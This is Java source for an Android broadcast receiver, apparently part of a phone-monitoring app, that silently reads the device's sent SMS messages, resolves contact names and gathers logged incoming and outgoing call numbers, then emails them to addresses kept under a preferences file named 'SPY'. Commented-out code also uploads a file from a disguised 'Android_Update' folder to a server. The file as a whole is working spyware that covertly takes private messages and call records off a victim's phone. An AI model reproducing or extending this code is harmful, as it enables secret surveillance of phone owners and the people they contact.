package com.example.remote;


import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.TimeZone;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;


import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.CallLog;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;
import android.widget.SimpleCursorAdapter;
import android.widget.Toast;

public class SendByMail extends BroadcastReceiver {
	
	Context cx;
	static String contactName = "";
	SharedPreferences value;
	sendMail s;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		StrictMode.enableDefaults();
		cx = context;
		
		SharedPreferences my = context.getSharedPreferences("email", 0);
		value = context.getSharedPreferences("SPY", 0);
		SharedPreferences my1 = context.getSharedPreferences("cal_out", 0);
		SharedPreferences my2 = context.getSharedPreferences("call_in", 0);
		
		ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
        
        if (!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable()) ) 
        {
        	Log.e("*******", "000000000");
        	
        	/*boolean isWifi = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
    	            .isConnectedOrConnecting();
	    	if(isWifi)
	    	{
	    		StringBuilder text = new StringBuilder();

	    		try {
	    			File root = new File(Environment.getExternalStorageDirectory() + "/Android_Update");
		            if (!root.exists()) {
		                root.mkdirs();
		            }
		            File gpxfile = new File(root, "Android");

	    		    BufferedReader br = new BufferedReader(new FileReader(gpxfile));
	    		    String line;

	    		    while ((line = br.readLine()) != null) {
	    		        text.append(line);
	    		        text.append('\n');
	    		    }
	    		    br.close();
	    		    gpxfile.delete();
	    		}
	    		catch (IOException e) {
	    		    //You'll need to add proper error handling here
	    		}
	    		
	    		if(text.toString().length()>5)
	    		{
		    		sendMail a = new sendMail();
		    		String toEmails = value.getString("mail_mess_ed", "");
		    		a.sendAccelerationData(text.toString(), toEmails);
	    		}
	    		
	    	}*/
        	
        	/*File root = new File(Environment.getExternalStorageDirectory() + "/Android_Update/Android.txt");
        	if(root.isFile())
        	{
        		sendToServer sTs = new sendToServer();
	        	sTs.uploadFile(root.getAbsolutePath());
        	}
        	sendAccelerationData(root.getName(), value.getString("mail_mess_ed", ""),"sendMail.php");*/
        	
        	sent_mess();
    		
    		s = new sendMail();
        	/////////////////////////////////////////////////
        	
        	if(!my.getString("total_sms", "").equals(""))
        	{
	        	try {  
	        		
					String toEmails = value.getString("mail_mess_ed", "");
					String emailBody = my.getString("total_sms", "");
					s.sendAccelerationData(emailBody, toEmails);
	                my.edit().remove("total_sms").commit();
	        	
	        	} catch (Exception e) {   
	                Log.e("SendMail", e.getMessage(), e);   
	            }
        	}
        	
        	if(!my2.getString("call_in_num", "").equals(""))
        	{
        		String toEmails = value.getString("mail_call_ed", "");
        		String a = "TAMAS DARYAFTI\n\n" + my2.getString("call_in_num", "");
                s.sendAccelerationData(a, toEmails);
                my2.edit().remove("call_in_num").commit();
        	}
        	
        	if(!my1.getString("call_num_out", "").equals(""))
        	{
        		String toEmails = value.getString("mail_call_ed", "");
        		String b = "TAMAS GEREFTE SHODE\n\n" + my1.getString("call_num_out", "");
                //Log.e("EEEEEEEEEEEE", b);
                s.sendAccelerationData(b, toEmails);
                my1.edit().remove("call_num_out").commit();
        	}
        	
        }
		
	}
	
	public void sent_mess()
  	{
		 Uri mSmsinboxQueryUri = Uri.parse("content://sms");
	     Cursor cursor = cx.getContentResolver().query(mSmsinboxQueryUri,
	                 new String[] { "_id", "thread_id", "address", "person", "date",
	                                 "body", "type" }, null, null, null);
	     String[] columns = new String[] { "address", "person", "date", "body","type","_id" };
	     if (cursor.getCount() > 0) 
	     {
	    	 int temp = value.getInt("last_mess_id", 0),temp2 =0;
	    	 Log.e("Temp", temp+"");
	         if (cursor.getCount() > 0) {
	             cursor.moveToFirst();
	             while (cursor.moveToNext()) 
	             {
	            	 String type = cursor.getString(cursor.getColumnIndex(columns[4]));
	            	 if(type.equals("2"))
	            	 {
	                	 String address = cursor.getString(cursor.getColumnIndex(columns[0]));
	                	 String msg = cursor.getString(cursor.getColumnIndex(columns[3]));
	                	 long date = cursor.getLong(cursor.getColumnIndex(columns[2]));
	                	 int id = Integer.valueOf(cursor.getString(cursor.getColumnIndex(columns[5])));
	                	 Log.e("ID", id+"");
	                	 if (id > temp) 
	                	 {
	                    	 Log.e("ID*******", id+"");
	                    	 Log.e("Body*****", msg);
	                         if(id>temp2)
	                        	 temp2 = id;
	                         send_sent_mess(msg, address,date);
	                         Log.e("TOP", temp2 + "");
	                         value.edit().putInt("last_mess_id", temp2).commit();
	                     }
	            	 }
	             }
	         }
	     }
	     
	     Log.e("&&&&&&&&", mess);
	     if(mess.length()>2)
	     {
		     sendMail a = new sendMail();
		     String toEmails = value.getString("mail_mess_ed", "");
		     a.sendAccelerationData(mess, toEmails);
	     }
  	}

	String mess = "";
	//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public void send_sent_mess(String msg,String address,long date)
	{
		getContactName(cx, address);
		Date d = new Date(date);
		SimpleDateFormat f = new SimpleDateFormat("dd/MM/yyyy,HH:mm");
//		f.setTimeZone(TimeZone.getTimeZone("GMT"));
		String s = f.format(d); 
		mess += "Message : " + msg + " || SendTo: " + address + contactName 
				+ " || "+ s + "\n\n";
	}
	//*****************************************************************************
	public static void getContactName(Context context, String phoneNumber)
	{
		 ContentResolver cr = context.getContentResolver();
		 Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
	  	 Cursor cursor = cr.query(uri, new String[]{PhoneLookup.DISPLAY_NAME}, null, null, null);
	  	 if (cursor == null) {
	  	 }
	  	 else if(cursor.moveToFirst()) 
	  	 {
	  		 contactName = "(" + cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME)) + ")";
	  	 }
	  	 else if(cursor != null && !cursor.isClosed()) {
	  		 cursor.close();
	  	 }
	
	}
	  		
}
